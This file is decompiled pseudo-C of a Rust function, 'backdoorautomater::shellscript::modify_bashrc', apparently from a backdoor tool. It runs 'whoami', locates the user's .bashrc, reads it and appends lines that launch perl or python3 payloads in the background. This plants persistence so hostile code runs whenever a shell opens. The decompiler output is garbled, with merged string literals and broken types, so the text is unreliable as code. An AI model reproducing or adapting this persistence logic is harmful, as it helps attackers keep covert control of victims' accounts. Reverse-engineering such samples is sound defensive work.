long long backdoorautomater::shellscript::modify_bashrc(struct_0 *a0, unsigned int a1)
{
    unsigned int v0;  // [bp-0x314]
    unsigned int v1;  // [bp-0x308]
    char v2;  // [bp-0x308]
    unsigned int v3;  // [bp-0x304]
    unsigned long long v4;  // [bp-0x300]
    char v5;  // [bp-0x2f8]
    char v6;  // [bp-0x2d0]
    int v7;  // [bp-0x2d0]
    int v8;  // [bp-0x2d0]
    int v9;  // [bp-0x2d0]
    unsigned long long v10;  // [sp-0x2c0]
    int v11;  // [bp-0x2b8]
    unsigned long long v12;  // [sp-0x2a8]
    void* v13;  // [bp-0x2a0]
    unsigned long long v14;  // [bp-0x298]
    void* v15;  // [bp-0x290]
    int v16;  // [bp-0x288]
    unsigned long long v17;  // [bp-0x280]
    unsigned long long v18;  // [bp-0x278]
    int v19;  // [bp-0x268], Other Possible Types: char
    unsigned long long v20;  // [sp-0x258]
    unsigned long long v21;  // [bp-0x240]
    int v22;  // [sp-0x238], Other Possible Types: unsigned long
    unsigned int v23;  // [bp-0x234]
    unsigned long long v24;  // [bp-0x230]
    int v25;  // [sp-0x228], Other Possible Types: unsigned long long
    unsigned long long v26;  // [bp-0x228]
    int v27;  // [bp-0x220]
    int v28;  // [bp-0x218]
    char v29;  // [bp-0x168]
    unsigned long long v30;  // [bp-0x158]
    char v31;  // [bp-0x148]
    unsigned long long v32;  // [bp-0x138]
    int v33;  // [bp-0x128]
    unsigned long long v34;  // [bp-0x118]
    unsigned long long v35;  // [bp-0x108]
    unsigned long long v36;  // [bp-0x100]
    unsigned long long v37;  // [bp-0xf8]
    char v38;  // [bp-0xf0]
    unsigned long long v39;  // [bp-0xe8]
    char v40;  // [bp-0xe0]
    unsigned long long v41;  // [bp-0xd0]
    char v42;  // [bp-0xc8]
    char v43;  // [bp-0xb8]
    unsigned long long v44;  // [bp-0xa8]
    char v45;  // [bp-0x98]
    unsigned long long v46;  // [bp-0x88]
    int v47;  // [bp-0x78], Other Possible Types: char
    int v48;  // [bp-0x68]
    int v49;  // [bp-0x58]
    char v50;  // [bp-0x48]
    unsigned long long v54;  // rdx
    int v56;  // xmm0
    unsigned long long v57;  // rdx
    unsigned long long v58;  // r14
    unsigned long long v59;  // rbp
    unsigned long v60;  // rax
    unsigned int v61;  // eax
    int v62;  // xmm0
    int v63;  // xmm0
    char v64;  // bpl

    v22 = &g_62a890;
    v24 = 1;
    v26 = 8;
    *((uint128_t *)&v27) = 0;
    std::io::stdio::_print(&(char)v22);
    (char)v22.to_vec("whoami &\n\nTrying to find the .bashrc file of the current user and rewrite it ! \n\n", 6);
    v30 = v26;
    memcpy(&v29, &v22, 16);
    (char)v22.new("sh-cFailed to execute commandsrc/shellscript.rs", 2);
    v2.output((char)v22.arg("-cFailed to execute commandsrc/shellscript.rs", 2).arg(&v29));
    v38.expect(&v2, &g_62a8a0);
    ::0x45daf0::core::ptr::drop_in_place<std::process::Command>(&(char)v22);
    v2.from_utf8_lossy(v41, *((long long *)&v42));
    (char)v22.to_vec(v2.deref(), v54);
    v32 = v26;
    memcpy(&v31, &v22, 16);
    ::0x45db90::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v2);
    backdoorautomater::sanitizer::sanitize_system_command(&v31);
    v2.from_utf8_lossy(v39, *((long long *)&v40));
    (char)v22.to_vec(v2.deref(), v54);
    v34 = v26;
    *((int128_t *)&v33) = *((int128_t *)&v22);
    ::0x45db90::core::ptr::drop_in_place<alloc::borrow::Cow<str>>(&v2);
    v56 = (int128_t)(&v33)[8];
    v22 = "/home/perl ";
    v24 = 6;
    v25 = v56;
    alloc::str::join_generic_copy(&v2, &(char)v22, 2, 1, 0);
    v57 = *((long long *)&v5);
    v18 = *((long long *)&v5);
    *((int128_t *)&v16) = *((int128_t *)&v2);
    alloc::str::<impl str>::replace(&(char)v22, v17, v57);
    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&(char)v16);
    v18 = v26;
    *((int128_t *)&v16) = *((int128_t *)&v22);
    (char)v16.extend_from_slice("/.bashrcpython3 all_cronSocketV4SocketV6Syntax(\n", 8);
    (char)v22.open(&(char)v16);
    if ((int)v22)
    {
        v58 = 6;
    }
    else
    {
        v47.with_capacity(0x2000, v23);
        v13 = 0;
        v14 = 8;
        v15 = 0;
        v28 = v49;
        v25 = v48;
        v22 = v47;
        v21 = 9223372036854775809;
        while (true)
        {
            v2.next(&(char)v22);
            v59 = *((long long *)&v1);
            if (v59 == v21)
            {
                ::0x45d9d0::core::ptr::drop_in_place<std::io::Lines<std::io::buffered::bufreader::BufReader<std::fs::File>>>(&(char)v22);
                v25 = v18;
                *((int128_t *)&v22) = (int128_t)v16;
                v2.create(&(char)v22);
                if (v1)
                {
                    v58 = v4;
                    goto LABEL_460799;
                }
                else
                {
                    v0 = v3;
                    v60 = a1;
                    if ((char)v60 != 1)
                    {
                        v61 = v60;
                        if (v61 == 2)
                        {
                            v62 = *((int128_t *)&(&a0->padding_0)[1]);
                            v22 = "perl ";
                            v24 = 5;
                            v25 = v62;
                            alloc::str::join_generic_copy(&v2, &(char)v22, 2, 1, 0);
                            v20 = *((long long *)&v5);
                            memcpy(&v19, &v1, 16);
                            v19.extend_from_slice(" &\n\nTrying to find the .bashrc file of the current user and rewrite it ! \n\n", 2);
                            (char)v22.to_vec("\n\nTrying to find the .bashrc file of the current user and rewrite it ! \n\n", 1);
                            v46 = v25;
                            memcpy(&v45, &v22, 16);
                            v13.push(&v45);
                            v25 = v20;
                            v22 = v19;
                            v13.push(&(char)v22);
                            (char)v22.into_iter(&v13);
                            (char)v8.next(&(char)v22);
                            if ((long long)v7 != 0x8000000000000000)
                            {
                                do
                                {
                                    v12 = v10;
                                    v11 = v8;
                                    v2.clone(&v11);
                                    v2.extend_from_slice("\n\nTrying to find the .bashrc file of the current user and rewrite it ! \n\n", 1);
                                    if (v0.write_all(v4, *((long long *)&v5)))
                                    {
                                        ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v2);
                                        ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v11);
                                        ::0x45def0::core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&(char)v22);
                                    }
                                    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v2);
                                    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v11);
                                    (char)v8.next(&(char)v22);
                                } while ((long long)v7 != 0x8000000000000000);
                            }
                            ::0x45def0::core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&(char)v22);
                        }
                        else if (v61 == 3)
                        {
                            v50.clone(a0);
                            v13.push(&v50);
                            (char)v22.into_iter(&v13);
                            (char)v7.next(&(char)v22);
                            if (*((long long *)&v6) != 0x8000000000000000)
                            {
                                do
                                {
                                    v12 = v10;
                                    v11 = v7;
                                    v2.clone(&v11);
                                    v2.extend_from_slice("\n\nTrying to find the .bashrc file of the current user and rewrite it ! \n\n", 1);
                                    if (v0.write_all(v4, *((long long *)&v5)))
                                    {
                                        ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v2);
                                        ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v11);
                                        ::0x45def0::core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&(char)v22);
                                    }
                                    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v2);
                                    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v11);
                                    (char)v7.next(&(char)v22);
                                } while (*((long long *)&v6) != 0x8000000000000000);
                            }
                            ::0x45def0::core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&(char)v22);
                        }
                        else
                        {
LABEL_460cba:
                            ::0x45da80::core::ptr::drop_in_place<std::fs::File>(v0);
                            if (!v64)
                                ::0x45dca0::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v13);
                            ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&(char)v33);
                            ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v31);
                            ::0x45da90::core::ptr::drop_in_place<std::process::Output>(&v38);
                            ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v29);
                            v58 = 0;
                            goto LABEL_46060c;
                        }
                    }
                    else
                    {
                        v63 = *((int128_t *)&(&a0->padding_0)[1]);
                        v22 = "python3 all_cronSocketV4SocketV6Syntax(\n";
                        v24 = 8;
                        v25 = v63;
                        alloc::str::join_generic_copy(&v2, &(char)v22, 2, 1, 0);
                        v20 = *((long long *)&v5);
                        memcpy(&v19, &v1, 16);
                        v19.extend_from_slice(" &\n\nTrying to find the .bashrc file of the current user and rewrite it ! \n\n", 2);
                        (char)v22.to_vec("\n\nTrying to find the .bashrc file of the current user and rewrite it ! \n\n", 1);
                        v44 = v25;
                        memcpy(&v43, &v22, 16);
                        v13.push(&v43);
                        v25 = v20;
                        v22 = v19;
                        v13.push(&(char)v22);
                        (char)v22.into_iter(&v13);
                        (char)v9.next(&(char)v22);
                        if ((long long)v8 != 0x8000000000000000)
                        {
                            do
                            {
                                v12 = v10;
                                v11 = v9;
                                v2.clone(&v11);
                                v2.extend_from_slice("\n\nTrying to find the .bashrc file of the current user and rewrite it ! \n\n", 1);
                                if (v0.write_all(v4, *((long long *)&v5)))
                                {
                                    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v2);
                                    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v11);
                                    ::0x45def0::core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&(char)v22);
                                }
                                ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v2);
                                ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v11);
                                (char)v9.next(&(char)v22);
                            } while ((long long)v8 != 0x8000000000000000);
                        }
                        ::0x45def0::core::ptr::drop_in_place<alloc::vec::into_iter::IntoIter<alloc::string::String>>(&(char)v22);
                    }
                    v64 = 1;
                    goto LABEL_460cba;
                }
            }
            v58 = v4;
            if (v59 == 0x8000000000000000)
                break;
            v35 = v59;
            v36 = v58;
            v37 = *((long long *)&v5);
            v13.push(&v35);
        }
        ::0x45d9d0::core::ptr::drop_in_place<std::io::Lines<std::io::buffered::bufreader::BufReader<std::fs::File>>>(&(char)v22);
LABEL_460799:
        ::0x45dca0::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v13);
        if (v59 == v21)
            goto LABEL_4605d8;
    }
    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&(char)v16);
LABEL_4605d8:
    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&(char)v33);
    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v31);
    ::0x45da90::core::ptr::drop_in_place<std::process::Output>(&v38);
    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(&v29);
LABEL_46060c:
    ::0x45dad0::core::ptr::drop_in_place<alloc::string::String>(a0);
    return v58;
}
